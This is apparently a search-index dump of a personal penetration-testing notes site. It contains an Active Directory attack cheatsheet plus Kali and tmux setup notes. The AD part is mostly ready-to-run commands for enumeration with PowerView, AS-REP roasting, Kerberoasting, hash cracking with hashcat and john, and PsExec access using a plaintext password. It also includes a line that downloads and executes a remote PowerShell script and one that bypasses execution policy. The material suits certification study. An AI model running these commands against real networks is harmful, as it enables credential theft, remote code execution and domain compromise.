[[{"l":"Broken Access Control"}],[{"l":"Annsh's Blog"},{"l":"author: Frank"},{"l":"author: frank@example.com"}],[{"l":"Eternal Blue","p":["icon: computer"]}],[{"l":"Cheatsheet"},{"l":"Nmap"},{"l":"Edit /etc/hosts file"},{"l":"Connecting to RDP"},{"l":"Hashcat","p":["https://hashcat.net/wiki/doku.php?id=example_hashes"]},{"l":"Active Directory"},{"l":"Password Spraying","p":["Crackmapexec - check if the output shows 'Pwned!'"]},{"l":"AS-REP Roasting","p":["Hash of AS-REP Roastable accounts"]},{"l":"Kerberoasting","p":["dumping from compromised windows host, and saving with customname"]}],[{"l":"AD Cheatsheet"},{"l":"Active Directory Methodology","p":["Mindmap = https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg","AD Enumeration- Using net user /domain- PowerView (Users and Groups)","Repeated Enumeration- Get-NetLoggedon | select UserName⇒ get all the users logged on the current machine- Get-NetSession⇒ List of active sessions on the current machine- Invoke-UserHunter -CheckAccess⇒ checks if domain admin is logged onto any computers and if we have admin access to those computers","AD Exploitation- Kerberoasting- AS-REP Roasting- Password Spraying using SMB/crackmapexec (after getting creds from kerberoasting/as-rep roasting)- Cached AD Credentials using Mimikatz","AD Lateral Movement- Port Forwarding / Tunneling- Overpass the Hash using Rubeus","Accessing AD machines- RDP- psexec- evil-winrm","Attack Privilege Requirements -","Kerbrute Enumeration - No domain access required Pass the Ticket - Access as a user to the domain required Kerberoasting - Access as any user required AS-REP Roasting - Access as any user required Golden Ticket - Full domain compromise (domain admin) required Silver Ticket - Service hash required Skeleton Key - Full domain compromise (domain admin) required"]},{"l":"AD Enumeration"},{"l":"net commands","p":["net users⇒ display users from current local machine","net useres /domain⇒ display users from the DC","net groups /domain⇒ enumerate groups on the DC","net localgroup⇒ groups on the local machine","net localgroup administrators⇒ groups that have admin access on the local machine","net group “Domain Admis” /domain⇒ get users within domain admin group","net group “Client Admis” /domain⇒ get users within client admin group"]},{"l":"Enumeration using PowerView","p":["Find-LocalAdminAccess- Scanning domain to find local administrative privileges for our user","Get-DomainController","Get-DomainGroup | select name, member","Get-DomainGroupMember -Identity Domain Admins","Get-DomainGroupMember -Identity Domain Admins -Recurse","Get-DomianComputer | select sameaccountname, cn, name","Get-DomianUser | select name, memberof","Get-NetComputer | select operatingsystem,dnshostname- Displaying OS and hostname","Get-NetDomain- Obtaining domain information","Get-NetGroup | select cn- Querying groups in the domain using PowerView","Get-NetGroup Sales Department | select member- Enumerating the \"Sales Department\" group","Get-NetLoggedon | select UserName⇒ get all the users logged on the current machine","Get-NetSession⇒ List of active sessions on the current machine","Get-NetUser | select cn- Querying users using select statement","Get-NetUser- Querying users in the domain","https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/powerview.html?highlight=powerview#powerviewsharpview","IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.1.1/powerview.ps1')","Import-Module .\\PowerView.ps1- Importing PowerView to memory","Invoke-UserHunter -CheckAccess⇒ checks if domain admin is logged onto any computers and if we have admin access to those computers","Load and Run PowerView.ps1 script using powershell","powershell -ep bypass- bypass the execution policy","PowerView.ps1 - https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"]},{"l":"AD Exploitation"},{"l":"AS-REP Roasting","p":["On Linux -","impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete- Using GetNPUsers to perform AS-REP roasting","hashcat --help | grep -i Kerberos”- Reviewing the correct Hashcat mode","sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force- Cracking the AS-REP hash with Hashcat","On Windows -","Rubeus - https://github.com/GhostPack/Rubeus",".\\Rubeus.exe asreproast /nowrap","sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"]},{"l":"Kerberoasting","p":["Kerberoasting⇒ Any user can get a service ticket for a service account⇒ service ticket is encrypted using a service account hash⇒ crack the hash using hashcat⇒ spray password using crackmapexec","Windows -",".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast- Utilizing Rubeus to perform a Kerberoast attack","sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force- Cracking the TGS-REP hash","On Linux -","sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete- Using impacket-GetUserSPNs to perform Kerberoasting on Linux","If impacket-GetUserSPNs throws the error \"KRB_AP_ERR_SKEW(Clock skew too great),\" we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.","Looking for Service Accounts (SPN - Service Principal Name)","If SPN is set ⇒ It is a service account","Get-DomainUser -SPN⇒ Find service accounts","Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath ‘c:\\users\\public\\HashCapture.txt’ -Width 8000⇒ get hash","hashcat -m 13100 -o cracked.txt -a 0 hashes.txt rockyou.txt⇒ crack the hash using hashcat"]},{"l":"PsExec","p":["Sysinterals - https://learn.microsoft.com/en-us/sysinternals/",".\\PsExec64.exe -i \\\\FILES04 -u corp\\jen -p Nexus123! cmd","Linux - impacket-psexec oscp/emmet@10.10.1.202⇒ get access to shares and shell on machine"]},{"l":"winrm / Evil-winrm"},{"l":"Hashcat","p":["Crack passwords after getting hashes from AS-REP roasting or Kerberoasting"]},{"l":"Crack Zip files","p":["zip2john it-users.zip⇒ gives hash of the zip file","john it-users.hash --wordlist=/usr/share/wordlists/rockyou.txt⇒ crack the hash"]},{"l":"Search for local.txt/proof.txt files on Windows","p":["dir /s/b local.txt","dir /s/b proof.txt","dir /s/b *.txt","dir /s/b *.log"]},{"l":"local/proof screenshot","p":["type proof.txt","whoami","ipconfig","hostname","================="]},{"l":"Connecting to RDP"},{"i":"hashcat-1","l":"Hashcat","p":["https://hashcat.net/wiki/doku.php?id=example_hashes"]},{"l":"Active Directory"},{"l":"Password Spraying","p":["Crackmapexec - check if the output shows 'Pwned!'"]},{"i":"as-rep-roasting-1","l":"AS-REP Roasting","p":["Hash of AS-REP Roastable accounts"]},{"i":"kerberoasting-1","l":"Kerberoasting","p":["dumping from compromised windows host, and saving with customname"]}],[{"l":"Kali Linux Setup","p":["Kali Linux Images - https://www.kali.org/get-kali/#kali-virtual-machines","pimpmykali - https://github.com/Dewalt-arch/pimpmykali"]},{"l":"Tmux","p":["Create a new session: tmux new -s Ignite To list all created sessions: tmux list-session Create new window: Prefix (ctrl-a) +c Rename window: Prefix (ctrl-a) + , To display summary: Prefix (ctrl-a) + w Kill the current window: Prefix (ctrl-a) + &","We can now use the following key-binds in TMUX.","Remember Prefix => [CTRL + A]","Prefix + c (Open a new Window) Prefix + “ (Open a horizontal pane) Prefix + % (Open a vertical pane) Prefix + , (Rename the Window) Mouse Click into any Window or Pane to switch to it. Prefix + [ (Scrollback mode)","Click space key to start copying.","Click Enter key to save the copied text to TMUX buffer.","Click Prefix + ] to paste the recently copied text from TMUX buffer.","Click Prefix + = to view the entire TMUX buffer.","Click Prefix + ? to search above in the terminal output.","Click Prefix + / to search below in the terminal output Prefix + SHIFT + p (Start/Stop logging in the current pane) Prefix + ALT + p (Save visible output on the current pane) Prefix + ALT + SHIFT + P (Save all the output on the current pane)"]},{"l":"Tmux Plugin Manager","p":["git clone https://github.com/tmux-plugins/tpm~/.tmux/plugins/tpm","Put this at the bottom of ~/.tmux.conf:","Reload TMUX environment so TPM is sourced:","TMUX Config","TEMP ->","there’s a config for you to enable mouse mode to scroll in tmux. \"set -g mouse on\" in your ~/.tmux.config file","enable logging","if z $SCRIPT; then read -p \"Enter the Log Script Name: \" filename export SCRIPT=/opt/bash_log/$(date +%Y%m%d-%H%M%S).$filename.log script \"$SCRIPT\" fi","start tmux with indexing 1","enabling Sudo which tmux visudo","Add following line under User Privilege specification => test All=(root) NOPASSWD: /usr/bin/tmux"]}]]